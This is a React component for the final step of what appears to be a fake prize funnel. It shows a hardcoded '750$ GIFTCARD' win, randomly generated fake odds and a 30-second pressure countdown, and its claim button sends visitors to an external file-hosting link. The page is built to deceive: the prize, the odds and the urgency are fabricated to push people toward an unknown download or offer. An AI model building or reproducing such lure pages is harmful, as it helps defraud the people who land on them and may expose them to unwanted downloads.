"use client"

import { useState, useEffect } from "react"
import { motion } from "framer-motion"
import ProgressBar from "./progress-bar"

interface GiftCardClaimPageProps {
  prizeAmount: number
  username: string
}

export default function GiftCardClaimPage({ prizeAmount, username }: GiftCardClaimPageProps) {
  const [timeLeft, setTimeLeft] = useState(30) // 30 seconds countdown
  const [isExpired, setIsExpired] = useState(false)

  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true)
      return
    }

    const timer = setInterval(() => {
      setTimeLeft((prevTime) => prevTime - 1)
    }, 1000)

    return () => clearInterval(timer)
  }, [timeLeft])

  const handleClaimPrize = () => {
    if (isExpired) {
      alert("Time's up! ⏰ You missed your chance. 😔")
      return
    }
    // Redirect to the specified link
    window.location.href = "https://quartzfiles.com/1815055"
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-400 to-blue-600 flex flex-col items-center justify-center p-4">
      <ProgressBar currentStep={5} totalSteps={5} />

      <div className="flex flex-col items-center justify-center flex-1 w-full max-w-md">
        <motion.div initial={{ opacity: 0, y: 50 }} animate={{ opacity: 1, y: 0 }} className="text-center w-full">
          <motion.div
            className="trust-card py-8 px-6 mb-8 flex flex-col items-center gap-y-6" // Use flex-col and gap-y for consistent spacing
            animate={{ scale: [1, 1.02, 1] }}
            transition={{ duration: 2.5, repeat: Number.POSITIVE_INFINITY }}
          >
            <motion.div // Re-added the rotating 🎉 emoji
              animate={{
                rotate: 360,
                scale: [1, 1.3, 1],
              }}
              transition={{
                rotate: { duration: 2, repeat: Number.POSITIVE_INFINITY, ease: "linear" },
                scale: { duration: 1, repeat: Number.POSITIVE_INFINITY },
              }}
              className="text-6xl" // Removed mb-4 here, let gap-y handle it
            >
              🎉
            </motion.div>

            {/* Main Prize Display Section */}
            <div className="bg-green-100 border-2 border-green-400 rounded-xl p-4 w-full">
              <h1 className="text-4xl font-black text-green-700 mb-2">YOU WON</h1>
              <p className="text-5xl font-black text-green-800 leading-none">750$ GIFTCARD!</p>
            </div>

            {/* Odds Text */}
            <p className="text-blue-500 font-bold text-lg">Odds: 1/{Math.floor(Math.random() * 900000) + 100000} 🌟</p>

            {/* Countdown Timer Section */}
            <motion.div
              className={`bg-red-600 text-white font-black text-3xl py-3 px-6 rounded-lg w-full ${isExpired ? "opacity-50" : ""}`}
              animate={{ scale: [1, 1.05, 1] }}
              transition={{ duration: 1, repeat: Number.POSITIVE_INFINITY }}
            >
              Claim in {timeLeft}s! ⏳
            </motion.div>

            <motion.button
              onClick={handleClaimPrize}
              disabled={isExpired}
              className={`trust-button w-full ${
                isExpired
                  ? "bg-gray-300 text-gray-500 border-gray-400 cursor-not-allowed"
                  : "bg-blue-600 hover:bg-blue-700 text-white border-blue-800"
              }`}
              whileHover={{ scale: isExpired ? 1 : 1.05 }}
              whileTap={{ scale: isExpired ? 1 : 0.95 }}
              animate={
                !isExpired
                  ? {
                      boxShadow: [
                        "0 4px 15px rgba(59,130,246,0.3)",
                        "0 8px 25px rgba(59,130,246,0.5)",
                        "0 4px 15px rgba(59,130,246,0.3)",
                      ],
                    }
                  : {}
              }
              transition={{ duration: 2, repeat: !isExpired ? Number.POSITIVE_INFINITY : 0 }}
            >
              CLAIM PRIZE! 🚀
            </motion.button>
          </motion.div>
        </motion.div>
      </div>
    </div>
  )
}
